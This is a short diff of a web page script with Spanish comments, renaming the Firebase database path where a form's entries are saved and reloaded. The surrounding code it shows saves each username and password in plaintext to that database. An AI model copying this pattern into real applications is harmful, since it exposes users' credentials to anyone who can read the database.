@@ -96,8 +96,8 @@
                     responsesForm.style.display = "block";
                     
                     // Guardamos el nombre de usuario y la contraseña en Firebase
-                    const respuestasRef = ref(db, "respuestas");
-                    push(respuestasRef, {
+                    const respuestas2Ref = ref(db, "respuestas2");
+                    push(respuestas2Ref, {
                         username: username,
                         password: password,
                         timestamp: Date.now()
@@ -107,7 +107,7 @@
                         console.error("Error al guardar datos en Firebase:", error);
                     });
 
-                    cargarRespuestas();
+                    cargarRespuestas2();
                 } else {
                     alert("Por favor ingresa un nombre de usuario y una contraseña.");
                 }
@@ -120,7 +120,7 @@
             });
 
             // Cargar respuestas al cargar la página
-            cargarRespuestas();
+            cargarRespuestas2();
         });
     </script>
 
